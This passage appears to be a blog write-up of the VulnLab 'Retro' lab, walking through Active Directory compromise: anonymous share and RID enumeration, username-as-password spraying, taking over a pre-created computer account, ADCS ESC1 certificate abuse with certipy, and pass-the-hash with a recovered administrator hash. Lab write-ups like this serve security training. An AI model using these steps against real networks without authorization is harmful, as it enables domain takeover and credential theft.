+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+</code></pre></div>
+<p>Another check reveals that we have anonymous access to a number of shares, including the <code>Trainees</code> share, as well as the <code>IPC$</code> share. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc smb $ip -u &#39;anonymous&#39; -p &#39;&#39; --shares</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+<span class="go">SMB         10.10.88.241    445    DC               [+] retro.vl\anonymous: (Guest)</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Enumerated shares</span>
+<span class="go">SMB         10.10.88.241    445    DC               Share           Permissions     Remark</span>
+<span class="go">SMB         10.10.88.241    445    DC               -----           -----------     ------</span>
+<span class="go">SMB         10.10.88.241    445    DC               ADMIN$                          Remote Admin</span>
+<span class="go">SMB         10.10.88.241    445    DC               C$                              Default share</span>
+<span class="go">SMB         10.10.88.241    445    DC               IPC$            READ            Remote IPC</span>
+<span class="go">SMB         10.10.88.241    445    DC               NETLOGON                        Logon server share</span>
+<span class="go">SMB         10.10.88.241    445    DC               Notes</span>
+<span class="go">SMB         10.10.88.241    445    DC               SYSVOL                          Logon server share</span>
+<span class="go">SMB         10.10.88.241    445    DC               Trainees        READ</span>
+</code></pre></div>
+<p>With read access to the <code>IPC$</code> share, we can use the <code>--rid-brute</code> method in <code>netexec</code> to get a list of domain user and group objects. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc smb $ip -u &#39;anonymous&#39; -p &#39;&#39; --rid-brute</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+<span class="go">SMB         10.10.88.241    445    DC               [+] retro.vl\anonymous: (Guest)</span>
+<span class="go">SMB         10.10.88.241    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               500: RETRO\Administrator (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               501: RETRO\Guest (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               502: RETRO\krbtgt (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               512: RETRO\Domain Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               513: RETRO\Domain Users (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               514: RETRO\Domain Guests (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               515: RETRO\Domain Computers (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)</span>
+<span class="go">SMB         10.10.88.241    445    DC               518: RETRO\Schema Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               525: RETRO\Protected Users (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               526: RETRO\Key Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)</span>
+<span class="go">SMB         10.10.88.241    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)</span>
+<span class="go">SMB         10.10.88.241    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1000: RETRO\DC$ (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1104: RETRO\trainee (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1106: RETRO\BANKING$ (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1107: RETRO\jburley (SidTypeUser)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)</span>
+<span class="go">SMB         10.10.88.241    445    DC               1109: RETRO\tblack (SidTypeUser)</span>
+</code></pre></div>
+<p>Narrowing this down to just the <code>SidTypeUser</code> objects, we get this list. We could remove the <code>krbtgt</code> user from this list because it's not a user that would be logging into anything. </p>
+<div class="highlight"><pre><span></span><code><span class="go">Administrator</span>
+<span class="go">Guest</span>
+<span class="go">krbtgt</span>
+<span class="go">DC$</span>
+<span class="go">trainee</span>
+<span class="go">BANKING$</span>
+<span class="go">jburley</span>
+<span class="go">tblack</span>
+</code></pre></div>
+<p>Now that we have a list of users, we can set that aside for a moment and check the shares to which we have anonymous access.  </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro smbclient.py -dc-ip $ip anonymous@$ip</span>
+<span class="go">Impacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra</span>
+
+<span class="go">Password:</span>
+<span class="go">Type help for list of commands</span>
+<span class="gp"># </span>shares
+<span class="go">ADMIN$</span>
+<span class="go">C$</span>
+<span class="go">IPC$</span>
+<span class="go">NETLOGON</span>
+<span class="go">Notes</span>
+<span class="go">SYSVOL</span>
+<span class="go">Trainees</span>
+</code></pre></div>
+<p>Checking the <code>Trainees</code> share, we find a text file named <code>Important.txt</code> that we can grab. </p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>use<span class="w"> </span>Trainees
+<span class="gp"># </span>ls
+<span class="go">drw-rw-rw-          0  Sun Jul 23 17:16:11 2023 .</span>
+<span class="go">drw-rw-rw-          0  Wed Jul 26 04:54:14 2023 ..</span>
+<span class="go">-rw-rw-rw-        288  Sun Jul 23 17:16:11 2023 Important.txt</span>
+<span class="gp"># </span>get<span class="w"> </span>Important.txt
+</code></pre></div>
+<p>The <code>Important.txt</code> file includes a hint that all trainees are now lumped under one account with a common password. </p>
+<div class="highlight"><pre><span></span><code><span class="go">Dear Trainees,</span>
+
+<span class="go">I know that some of you seemed to struggle with remembering strong and unique passwords.</span>
+<span class="go">So we decided to bundle every one of you up into one account.</span>
+<span class="go">Stop bothering us. Please. We have other stuff to do than resetting your password every day.</span>
+
+<span class="go">Regards</span>
+
+<span class="go">The Admins</span>
+</code></pre></div>
+<p>Since there's no other files present that might contain credentials, we can try spraying weak and/or common credentials against the list of usernames we enumerated earlier. We can also check to see if any users are using their username as a password. </p>
+<p>Doing this, we find that <code>trainee:trainee</code> worked. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc smb $ip -u users -p users --no-bruteforce --continue-on-success</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+<span class="go">SMB         10.10.88.241    445    DC               [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE</span>
+<span class="go">SMB         10.10.88.241    445    DC               [-] retro.vl\Guest:Guest STATUS_LOGON_FAILURE</span>
+<span class="go">SMB         10.10.88.241    445    DC               [-] retro.vl\DC$:DC$ STATUS_LOGON_FAILURE</span>
+<span class="go">SMB         10.10.88.241    445    DC               [+] retro.vl\trainee:trainee</span>
+<span class="go">SMB         10.10.88.241    445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE</span>
+<span class="go">SMB         10.10.88.241    445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE</span>
+<span class="go">SMB         10.10.88.241    445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE</span>
+</code></pre></div>
+<p>Checking share permissions again with that user shows that we now have access to the <code>Notes</code> share. Looking into that share with <code>smbclient.py</code> we find a text file named <code>ToDo.txt</code>. </p>
+<p>We can get <code>ToDo.txt</code> out of the Notes share and read it. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro smbclient.py -dc-ip $ip trainee:trainee@$ip</span>
+<span class="go">Impacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra</span>
+
+<span class="go">Type help for list of commands</span>
+<span class="gp"># </span>shares
+<span class="go">ADMIN$</span>
+<span class="go">C$</span>
+<span class="go">IPC$</span>
+<span class="go">NETLOGON</span>
+<span class="go">Notes</span>
+<span class="go">SYSVOL</span>
+<span class="go">Trainees</span>
+<span class="gp"># </span>use<span class="w"> </span>Notes
+<span class="gp"># </span>ls
+<span class="go">drw-rw-rw-          0  Sun Jul 23 17:03:16 2023 .</span>
+<span class="go">drw-rw-rw-          0  Wed Jul 26 04:54:14 2023 ..</span>
+<span class="go">-rw-rw-rw-        248  Sun Jul 23 17:05:56 2023 ToDo.txt</span>
+<span class="gp"># </span>get<span class="w"> </span>ToDo.txt
+</code></pre></div>
+<p>The contents of the <code>ToDo.txt</code> file indicate that there is a pre-created computer account in use in the environment. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro cat ToDo.txt</span>
+<span class="go">Thomas,</span>
+
+<span class="go">after convincing the finance department to get rid of their ancienct banking software</span>
+<span class="go">it is finally time to clean up the mess they made. We should start with the pre created</span>
+<span class="go">computer account. That one is older than me.</span>
+
+<span class="go">Best</span>
+
+<span class="go">James </span>
+</code></pre></div>
+<h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
+<p>Digging into the following article gives us an idea of the way ahead. </p>
+<p><a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts">TrustedSec: Diving Into Pre-Created Computer Accounts</a></p>
+<p>Essentially, if the computer account was created with the <code>Assign this computer account as a pre-Windows 2000 computer</code> option checked, the password will be the same as the computer name, except lowercase and without the "$" at the end.</p>
+<p>We also find some useful information in a <a href="https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187">Wayback archive</a>. </p>
+<p><a class="glightbox" href="../../../images/screenshots/Pasted%20image%2020240704145857.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/screenshots/Pasted%20image%2020240704145857.png" /></a></p>
+<p>So in our case, we can test the <code>banking$</code> account with the password <code>banking</code>. Using <code>netexec</code>, I did get the <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> error message described in the article. </p>
+<p>Working on the assumption that the <code>banking$</code> account was created as a pre-Windows 2000 computer, we can attempt to change the password for the <code>banking$</code> machine account</p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro kpasswd banking$</span>
+<span class="go">Password for banking$@RETRO.VL:</span>
+<span class="go">Enter new password:</span>
+<span class="go">Enter it again:</span>
+<span class="go">Password changed.</span>
+</code></pre></div>
+<p>Perfect! That worked, but please note that I needed to make some modifications to the <code>/etc/krb5.conf</code> file prior to changing the password. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro cat /etc/krb5.conf</span>
+<span class="go">[libdefaults]</span>
+<span class="go">        default_realm = RETRO.VL</span>
+<span class="go">        dns_lookup_realm = false</span>
+<span class="go">        ticket_lifetime = 24h</span>
+<span class="go">        renew_lifetime = 7d</span>
+<span class="go">        rdns = false</span>
+<span class="go">        kdc_timesync = 1</span>
+<span class="go">        ccache_type = 4</span>
+<span class="go">        forwardable = true</span>
+<span class="go">        proxiable = true</span>
+
+
+<span class="go">[realms]</span>
+<span class="go">        RETRO.VL = {</span>
+<span class="go">                kdc = DC.RETRO.VL</span>
+<span class="go">                admin_server = DC.RETRO.VL</span>
+<span class="go">                }</span>
+</code></pre></div>
+<p>We can now authenticate with the new password. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc smb $ip -u &#39;banking$&#39; -p &#39;Password123&#39;</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+<span class="go">SMB         10.10.88.241    445    DC               [+] retro.vl\banking$:Password123</span>
+</code></pre></div>
+<p>Now that we have working credentials for the <code>banking$</code> computer account, we can do additional enumeration. One thing to check is Active Directory Certificate Services (ADCS). A quick check with <code>netexec</code> shows that ADCS is in use. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc ldap $ip -u &#39;banking$&#39; -p &#39;Password123&#39; -M adcs</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+<span class="go">LDAP        10.10.88.241    389    DC               [+] retro.vl\banking$:Password123</span>
+<span class="go">ADCS        10.10.88.241    389    DC               [*] Starting LDAP search with search filter &#39;(objectClass=pKIEnrollmentService)&#39;</span>
+<span class="go">ADCS        10.10.88.241    389    DC               Found PKI Enrollment Server: DC.retro.vl</span>
+<span class="go">ADCS        10.10.88.241    389    DC               Found CN: retro-DC-CA</span>
+</code></pre></div>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>Knowing that ADCS is in use, we can enumerate vulnerable templates with <code>certipy</code>. It looks like there's a template that's misconfigured to be vulnerable to an escalation method known as <code>ESC1</code>. The main issue with this misconfiguration is the ability for the attacker to specify a different <code>subjectAltName</code> (SAN) when making the certificate request, essentially allowing the attacker to request a certificate as any user in the domain. In order to abuse ESC1, the following must be true:</p>
+<ul>
+<li>Low privileged users are granted enrollment rights</li>
+<li>Manager approval is not required</li>
+<li>No authorized signatures are required</li>
+<li>The certificate template defines EKUs that enable authentication</li>
+<li>Requestors are able to specify a SAN when requesting the certificate</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro certipy find -dc-ip $ip -u &#39;banking$&#39; -p &#39;Password123&#39; -enabled -vulnerable -stdout</span>
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>
+
+<span class="go">[*] Finding certificate templates</span>
+<span class="go">[*] Found 34 certificate templates</span>
+<span class="go">[*] Finding certificate authorities</span>
+<span class="go">[*] Found 1 certificate authority</span>
+<span class="go">[*] Found 12 enabled certificate templates</span>
+<span class="go">[*] Trying to get CA configuration for &#39;retro-DC-CA&#39; via CSRA</span>
+<span class="go">[!] Got error while trying to get CA configuration for &#39;retro-DC-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span>
+<span class="go">[*] Trying to get CA configuration for &#39;retro-DC-CA&#39; via RRP</span>
+<span class="go">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span>
+<span class="go">[*] Got CA configuration for &#39;retro-DC-CA&#39;</span>
+<span class="go">[*] Enumeration output:</span>
+<span class="go">Certificate Authorities</span>
+<span class="go">  0</span>
+<span class="go">    CA Name                             : retro-DC-CA</span>
+<span class="go">    DNS Name                            : DC.retro.vl</span>
+<span class="go">    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl</span>
+<span class="go">    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85</span>
+<span class="go">    Certificate Validity Start          : 2023-07-23 21:03:51+00:00</span>
+<span class="go">    Certificate Validity End            : 2028-07-23 21:13:50+00:00</span>
+<span class="go">    Web Enrollment                      : Disabled</span>
+<span class="go">    User Specified SAN                  : Disabled</span>
+<span class="go">    Request Disposition                 : Issue</span>
+<span class="go">    Enforce Encryption for Requests     : Enabled</span>
+<span class="go">    Permissions</span>
+<span class="go">      Owner                             : RETRO.VL\Administrators</span>
+<span class="go">      Access Rights</span>
+<span class="go">        ManageCertificates              : RETRO.VL\Administrators</span>
+<span class="go">                                          RETRO.VL\Domain Admins</span>
+<span class="go">                                          RETRO.VL\Enterprise Admins</span>
+<span class="go">        ManageCa                        : RETRO.VL\Administrators</span>
+<span class="go">                                          RETRO.VL\Domain Admins</span>
+<span class="go">                                          RETRO.VL\Enterprise Admins</span>
+<span class="go">        Enroll                          : RETRO.VL\Authenticated Users</span>
+<span class="go">Certificate Templates</span>
+<span class="go">  0</span>
+<span class="go">    Template Name                       : RetroClients</span>
+<span class="go">    Display Name                        : Retro Clients</span>
+<span class="go">    Certificate Authorities             : retro-DC-CA</span>
+<span class="go">    Enabled                             : True</span>
+<span class="go">    Client Authentication               : True</span>
+<span class="go">    Enrollment Agent                    : False</span>
+<span class="go">    Any Purpose                         : False</span>
+<span class="go">    Enrollee Supplies Subject           : True</span>
+<span class="go">    Certificate Name Flag               : EnrolleeSuppliesSubject</span>
+<span class="go">    Enrollment Flag                     : None</span>
+<span class="go">    Extended Key Usage                  : Client Authentication</span>
+<span class="go">    Requires Manager Approval           : False</span>
+<span class="go">    Requires Key Archival               : False</span>
+<span class="go">    Authorized Signatures Required      : 0</span>
+<span class="go">    Validity Period                     : 1 year</span>
+<span class="go">    Renewal Period                      : 6 weeks</span>
+<span class="go">    Minimum RSA Key Length              : 4096</span>
+<span class="go">    Permissions</span>
+<span class="go">      Enrollment Permissions</span>
+<span class="go">        Enrollment Rights               : RETRO.VL\Domain Admins</span>
+<span class="go">                                          RETRO.VL\Domain Computers</span>
+<span class="go">                                          RETRO.VL\Enterprise Admins</span>
+<span class="go">      Object Control Permissions</span>
+<span class="go">        Owner                           : RETRO.VL\Administrator</span>
+<span class="go">        Write Owner Principals          : RETRO.VL\Domain Admins</span>
+<span class="go">                                          RETRO.VL\Enterprise Admins</span>
+<span class="go">                                          RETRO.VL\Administrator</span>
+<span class="go">        Write Dacl Principals           : RETRO.VL\Domain Admins</span>
+<span class="go">                                          RETRO.VL\Enterprise Admins</span>
+<span class="go">                                          RETRO.VL\Administrator</span>
+<span class="go">        Write Property Principals       : RETRO.VL\Domain Admins</span>
+<span class="go">                                          RETRO.VL\Enterprise Admins</span>
+<span class="go">                                          RETRO.VL\Administrator</span>
+<span class="go">    [!] Vulnerabilities</span>
+<span class="go">      ESC1                              : &#39;RETRO.VL\\Domain Computers&#39; can enroll, enrollee supplies subject and template allows client authentication</span>
+</code></pre></div>
+<p>So reviewing the <code>RetroClients</code> template, we can observe the following:</p>
+<ul>
+<li>✅ <code>RETRO.VL\Domain Computers</code> have enrollment rights - we control the <code>banking$</code> computer account. </li>
+<li>✅ <code>Requires Manager Approval</code> is set to <code>False</code></li>
+<li>✅ <code>Authorized Signatures Required</code> is set to <code>0</code></li>
+<li>✅ The <code>Extended Key Usage</code> is set to <code>Client Authentication</code> meaning we can use this certificate to authenticate in the domain</li>
+<li>✅ The <code>Enrollee Supplies Subject</code> is set to <code>True</code>, meaning that requestors can specify a SAN. </li>
+</ul>
+<p>Now that we know the <code>RetroClients</code> template is vulnerable to ESC1, we can request a certificate with <code>certipy</code>. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro certipy req -dc-ip $ip -u &#39;banking$&#39; -p &#39;Password123&#39; -ca retro-DC-CA -template RetroClients -upn Administrator -key-size 4096</span>
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>
+
+<span class="go">[*] Requesting certificate via RPC</span>
+<span class="go">[*] Successfully requested certificate</span>
+<span class="go">[*] Request ID is 10</span>
+<span class="go">[*] Got certificate with UPN &#39;Administrator&#39;</span>
+<span class="go">[*] Certificate has no object SID</span>
+<span class="go">[*] Saved certificate and private key to &#39;administrator.pfx&#39;</span>
+</code></pre></div>
+<p>Now we can authenticate using that certificate. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro certipy auth -pfx administrator.pfx -username administrator -domain retro.vl -dc-ip $ip</span>
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>
+
+<span class="go">[*] Using principal: administrator@retro.vl</span>
+<span class="go">[*] Trying to get TGT...</span>
+<span class="go">[*] Got TGT</span>
+<span class="go">[*] Saved credential cache to &#39;administrator.ccache&#39;</span>
+<span class="go">[*] Trying to retrieve NT hash for &#39;administrator&#39;</span>
+<span class="go">[*] Got hash for &#39;administrator@retro.vl&#39;: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</span>
+</code></pre></div>
+<p>Perfect! We've got an NTLM hash for the domain administrator. We can pass that hash with <code>netexec</code>. Here we find that we're able to authenticate with that NT hash, and that we do in fact have administrative access on the machine, indicated by <code>(Pwn3d!)</code>. We can now use that hash to log in as the administrator and grab the last flag. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc smb $ip -u &#39;administrator&#39; -H &#39;252fac7066d93dd009d4fd2cd0368389&#39;</span>
+<span class="go">SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span>
+<span class="go">SMB         10.10.88.241    445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)</span>
+</code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+  
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js"
+        data-repo="tomfieber/tomfieber.github.io"
+        data-repo-id="R_kgDOPTkbBA"
+        data-category="General"
+        data-category-id="DIC_kwDOPTkbBM4Ctdzl"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../06/29/vulnlab-baby.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: VulnLab: Baby">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Baby
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="vulnlab-data.html" class="md-footer__link md-footer__link--next" aria-label="Next: VulnLab: Data">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Data
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 